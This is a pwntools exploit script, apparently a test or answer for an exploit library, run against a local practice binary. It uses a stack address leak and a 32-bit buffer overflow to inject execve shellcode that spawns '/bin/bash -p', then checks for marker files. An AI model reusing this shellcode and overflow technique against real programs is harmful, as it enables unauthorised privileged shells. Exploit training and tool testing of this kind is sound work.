from pwn import *
import time
import sys
import signal
import sf

target = process("./Correction-BofShellcode-x86")
gdb.attach(target, execute="verify_exploit")

bof_payload = sf.BufferOverflow(arch=32)

target.recvuntil("Stack Infoleak: ")
leak = int(target.recvline().strip(b"\n"), 16)
ret_address = leak + (112)
bof_payload.add_base("stack", ret_address)

bof_payload.set_input_start(0x70)
bof_payload.add_bytes(0x70, b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")
bof_payload.set_ret(-0x70, "stack")
payload = bof_payload.generate_payload()
target.sendline(payload)

# Exploit Verification starts here 15935728

def handler(signum, frame):
	raise Exception("Timed out")

def check_verification_done():
	while True:
		if os.path.exists("pwned") or os.path.exists("rip"):
			sys.exit(0)

signal.signal(signal.SIGALRM, handler)
signal.alarm(2)

try:
	while True:
		check_verification_done()
except Exception:
	print("Exploit timed out")
